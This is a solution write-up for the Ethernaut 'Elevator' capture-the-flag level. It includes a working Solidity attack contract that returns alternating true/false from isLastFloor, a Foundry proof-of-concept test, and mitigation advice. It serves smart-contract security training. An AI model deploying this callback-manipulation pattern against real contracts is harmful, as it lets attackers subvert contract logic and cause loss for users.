# Level 11 - Elevator

## Objectives

- The goal of this challenge is to be able to reach the top floor of the building.

## Contract Overview

The `Elevator` is a pretty simple contract. It defines a `Building` interface at the top.

An interface in Solidity is similar to an abstract contract which lets you interact with other contracts. It can only have the function signature and there can't be any function implementation.

In the `Elevator` contract, we have the `goTo` function that takes a `uint256 _floor`. This function is expected to be called by a smart contract that implements the `Building` interface and taking the address as the address of the `msg.sender`, i.e., attacker address. This building instance is being used inside the function to check if the function `isLastFloor` is returning `true` or `false`.

If the floor is not the top of the building, the function update the `floor` state variable and update also the `top` state variable that should be `false` given that attacker entered the `if` state only because the same `building.isLastFloor` function has returned false just two lines of code above.

This means that the function `isLastFloor()` should return `false` to pass the if conditional and then it should return `true` to set the `top` variable to `true` which will complete the level.

## Static analysis (slither)

Here are the logs from the slither:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Elevator_slither.png)

## Finding the weak spots

Since we can control the address from which the `Building` instance is created, we can create our own `Building` contract and implement a function with the name of `isLastFloor` following a similar structure as shown in the `Building` interface.

This will allow us to have complete control over the return values from the function `isLastFloor`. To finish this level, we must make the function return `false` when it is run the first time and then it should return `true` if run a second time, all within a single call to the `goTo` function.

```solidity
  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) { // <-- this line over here
      floor = _floor;
      top = building.isLastFloor(floor); // <-- this line over here
    }
  }
```

## Potential attack scenario (hypothesis)

Attacker can create a malicious contract that will inherit the `Building` interface. This contract will implement the `isLastFloor` function in a way that will return forged results. This way attacker will set the boolean top to the value of true.

## Plan of the attack

1. Attacker creates the malicious contract that that will inherit the `Building` interface.
2. Attacker calls `goToFloor()` function on the malicious contract that calls the `Elevator` contracts `goTo(uint256)` function.
3. The `Elevator` contract calls back to the malicious contract because of `isLastFloor()` function.
4. `isLastFloor()` function in the malicious contract returns `false `in the first call and returns `true` in second call.
5. The bool `top` is set to `true`.

## Malicious contract (ElevatorAttack.sol)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract ElevatorAttack is Building {
    Elevator private elevatorContract;
    bool private firstCall;

    constructor(address _elevatorContract) public {
        elevatorContract = Elevator(_elevatorContract);
        firstCall = true;
    }

    function goToFloor() public {
        elevatorContract.goTo(1);
    }

    function isLastFloor(uint) external override returns (bool) {
        if (firstCall) {
            firstCall = false;
        } else {
            firstCall = true;
        }
        return firstCall;
    }
}
```

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/11-Elevator.t.sol))

```solidity
 ElevatorAttack elevatorAttack = new ElevatorAttack(
            address(elevatorContract)
        );
        console.log("Is it top level?", elevatorContract.top());
        emit log_string("Starting the exploit...");
        elevatorAttack.goToFloor();

        console.log("Is it top level?", elevatorContract.top());

        // Test assertion
        assertEq(elevatorContract.top(), true);
```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Elevator.png)

## Recommendations

- Only integrate with external contract that have a verified source code and that you can read what they do and with which other external service they will integrate
- If the external service is upgradable, you must really trust that the owner of the service will not act maliciously in the future
- Even if you trust the external actor, put some safeguards in the contract like some kind of pausable and emergency logic
- Interactions with other contracts always come with a certain level of threat. Because interfaces can contain arbitrary logic, it is especially important to treat them with caution. Contracts that you call may re-enter your contract. It is recommended to apply the checks-effects-interactions pattern to avoid making external calls before making state changes.

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [Blog Stermi](https://stermi.xyz/blog/ethernaut-challenge-11-solution-elevator)
- [D-Squared YT - Ethernaut CTF Series](https://www.youtube.com/watch?v=_ylKN2R_o-Y&list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz)
- [Smart Contract Programmer YT - Ethernaut](https://www.youtube.com/playlist?list=PLO5VPQH6OWdWh5ehvlkFX-H3gRObKvSL6)
- [Mastering Ethereum book](https://github.com/ethereumbook/ethereumbook)
- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)
